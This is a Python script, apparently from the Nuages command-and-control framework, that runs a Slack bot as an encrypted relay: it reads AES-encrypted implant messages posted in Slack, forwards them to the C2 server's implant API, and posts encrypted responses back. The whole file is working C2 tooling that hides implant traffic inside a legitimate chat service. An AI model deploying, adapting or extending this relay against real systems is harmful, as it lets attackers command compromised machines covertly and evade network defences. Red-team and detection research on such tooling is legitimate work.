#!python3
import os
import slack
import json
import base64
import hashlib
import requests
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import cgi
from sys import argv
import binascii
from io import StringIO
import argparse

class HTTPerror(Exception):
    def __init__(self,HTTPCode,HTTPContent):
        self.HTTPCode = HTTPCode
        self.HTTPContent = HTTPContent


class AESCipher(object):

    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')
        #return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        #enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        #return pkcs7.encode(s)
        return pad(s, AES.block_size, style='pkcs7')

    def _unpad(self, s):
        #return pkcs7.decode(s)
        return unpad(s, AES.block_size, style='pkcs7')

        

def POST(url, body):
	headers = {'Content-type': 'application/json; charset=utf-8'}
	if(args.id):
		headers["listener"] = args.id
	response = requests.post(connectionString + url, data = body.encode('utf-8'), verify=True, headers=headers)
	if(response.ok):
		return response.content
	else:
		return str(response.status_code).encode('ascii')


@slack.RTMClient.run_on(event='message')
def processImplantMessage(**payload):
    try:
        data = payload['data']
        web_client = payload['web_client']
        rtm_client = payload['rtm_client']
        if not('subtype' in data.keys() and data["subtype"] == "message_replied") and (data["bot_id"] !=bot_id):
            channel_id = data['channel']
            thread_ts = data['ts']
            query = json.loads(data["text"])
            url = query["url"]
            if(not(args.quiet)):
                print(url)
            body = aes.decrypt(base64.b64decode(query["body"]))
            if(url == "jobresult"):
                POST(url, body)
                return
            resp = aes.encrypt(POST(url, body))
            web_client.chat_postMessage(
                channel=channel_id,
                text=resp,
                thread_ts=thread_ts
            )
    except Exception as e:
        print(e)
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start an encrypted Nuages Slack handler')
    parser.add_argument("-t", "--token", required=True,  help="The slack token")
    parser.add_argument("-b", "--bot", required=True,  help="The slack bot ID")
    parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
    parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
    parser.add_argument("-i", "--id", help="The listener ID for listener tracking")
    parser.add_argument("-q", "--quiet", action='store_true', help="Hide logs")
    args = parser.parse_args()

    # The encryption password
    aes = AESCipher(args.key)

    #The address of the Nuages C2 Server
    connectionString  = args.uri + "/implant/"
    
    #The bot id, to prevent replying to your own messages
    bot_id = args.bot

    #The slack token
    slack_token = args.token

    rtm_client = slack.RTMClient(token=slack_token)
    rtm_client.start()
